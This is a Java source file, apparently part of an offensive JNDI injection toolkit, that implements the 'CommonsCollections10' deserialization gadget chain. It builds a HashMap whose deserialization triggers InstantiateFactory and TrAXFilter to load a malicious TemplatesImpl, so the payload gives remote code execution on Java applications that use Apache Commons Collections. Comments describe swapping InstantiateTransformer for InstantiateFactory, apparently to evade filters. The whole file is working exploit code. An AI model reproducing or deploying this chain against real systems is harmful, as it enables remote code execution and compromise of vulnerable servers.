package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

import static com.nu1r.jndi.gadgets.utils.Reflections.setFieldValue;

public class CommonsCollections10 implements ObjectPayload<Object> {

    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object           templates         = Gadgets.createTemplatesImpl(type, param);
        // 使用 InstantiateFactory 代替 InstantiateTransformer
        InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});

        FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);

        // 先放一个无关键要的 Transformer
        ConstantTransformer constantTransformer = new ConstantTransformer(1);

        Map     innerMap = new HashMap();
        LazyMap outerMap = (LazyMap) LazyMap.decorate(innerMap, constantTransformer);

        TiedMapEntry tme    = new TiedMapEntry(outerMap, "su18");
        Map          expMap = new HashMap();
        expMap.put(tme, "su19");

        setFieldValue(outerMap, "factory", factoryTransformer);

        outerMap.remove("su18");

        return expMap;
    }
}
